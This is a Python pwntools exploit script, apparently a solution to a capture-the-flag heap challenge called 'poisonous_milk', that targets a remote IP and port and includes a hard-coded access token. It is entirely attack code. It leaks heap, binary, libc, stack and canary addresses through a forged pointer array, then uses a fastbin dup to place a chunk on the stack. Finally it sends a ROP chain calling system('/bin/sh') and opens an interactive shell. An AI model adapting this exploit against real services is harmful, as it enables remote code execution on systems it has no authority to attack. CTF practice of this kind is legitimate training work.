from pwn import *
#io = process('./poisonous_milk', env = {'LD_PRELOAD' : './libc-2.23.so'})
io = remote('52.27.136.59', 6969)
context.log_level = 'debug'

def menu(ch):
    io.recvuntil('>')
    io.sendline(ch)

def put_milk(flag, color):
    menu('p')
    io.recvuntil(': ')
    io.sendline(flag)
    io.recvuntil(': ')
    io.sendline(color)

def view_milk():
    menu('v')

def remove_milk(idx):
    menu('r')
    io.recvuntil(': ')
    io.sendline(str(idx))

def drink():
    menu('d')

io.recvuntil('Token:')
io.sendline('gpRGF622u64jnH6rlgoLgpqGQCjZL42c')
put_milk('1', 'red')
drink()
put_milk('', 'red') # 0
view_milk()
io.recvuntil('[red] ')
heap_addr = u64(io.recvuntil('\n')[:-1].ljust(8, '\x00'))
log.info('heap_addr :' + hex(heap_addr))
heap_main = heap_addr - 0xc0

# fake array
p =p64(heap_main + 0x110)+p64(heap_main + 0x160)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0x140)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0xc0)
payload3 = p64(heap_main + 0xa0) + p64(heap_main + 0xe0)

p = p + payload3
p = p.ljust(80, '\x00')

put_milk(p, 'red') # 1
put_milk('4' * 80, 'red') # 2
put_milk('5' * 80, 'red') # 3
put_milk('6' * 80, 'blue') # 4

remove_milk(2) # remove one before we remove the head so that we can put other milks
remove_milk(0)
payload = p64(heap_main + 0x2f0)+p64(heap_main + 0x318)
payload = p64(heap_main + 0xe0) + p64(heap_main + 0xe0 + 0x28)
put_milk('7' * 80, 'blue') # 5
put_milk(payload, 'red') 

view_milk()
io.recvuntil('[0] [')
bin_addr = u64(io.recvuntil(']')[:-1].ljust(8, '\x00'))
log.info('bin_addr :' + hex(bin_addr))
bin_main = bin_addr - 0x205b
log.info('bin_main :' + hex(bin_main))
 
# leak libc
remove_milk(3)
p = p64(heap_main + 0x110)+p64(heap_main + 0x160)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0x140)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0xc0)
p += p64(bin_main + 0x203020) + p64(heap_main + 0xe0)

p = p.ljust(80, '\x00') #0x0000555555769ce0
put_milk(p, 'blue')

view_milk()
io.recvuntil('[0] [')
libc_addr = u64(io.recvuntil(']')[:-1].ljust(8, '\x00'))
log.info('libc_addr :' + hex(libc_addr))
libc_main = libc_addr - 0x7ff4fa1188e0 + 0x7ff4f9d55000 
log.info('libc_main :' + hex(libc_main))

# leak stack
l = ELF('./libc-2.23.so')
remove_milk(3)
p =p64(heap_main + 0x110)+p64(heap_main + 0x160)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0x140)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0xc0)
p += p64(libc_main + l.symbols['environ']) + p64(heap_main + 0xe0)
p = p.ljust(80, '\x00') #0x0000555555769ce0
put_milk(p, 'green')

view_milk()
io.recvuntil('[0] [')
stack_addr = u64(io.recvuntil(']')[:-1].ljust(8, '\x00'))
log.info('stack_addr :' + hex(stack_addr))

# leak canary
remove_milk(3)
p =p64(heap_main + 0x110)+p64(heap_main + 0x160)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0x140)
p += p64(heap_main + 0x2d0)+p64(heap_main + 0xc0)
p += p64(stack_addr - 0x7fffffffe618 + 0x7fffffffe4e8 - 0x7) + p64(heap_main + 0xe0)

p = p.ljust(80, '\x00')
put_milk(p, 'green')

view_milk()
io.recvuntil('[0] [')
canary = u64('\x00' + io.recvn(7))
log.info('canary :' + hex(canary))



#now need to make a fastbin dup attack

remove_milk(4)
remove_milk(1)
remove_milk(1)

malloced_addr = stack_addr + 0x7fffffffe400 - 0x7fffffffe638 + 0x40 - 0x8
put_milk(p64(malloced_addr).ljust(80, '1'), 'red')
put_milk('2' * 80, 'red')
put_milk('3' * 80, 'red')

#next malloc will be on the stack, and we will overflow to the ret_addr
payload = '1' * 0x8
payload += p64(canary)
payload += '1' * 0x18
payload += p64(libc_main + 0x0000000000021102)
payload += p64(libc_main + l.search('/bin/sh').next())
payload += p64(libc_main + l.symbols['system'])
payload += p64(0) + p64(0x61)
menu('p')
io.recvuntil(': ')
io.sendline(payload)


io.interactive()
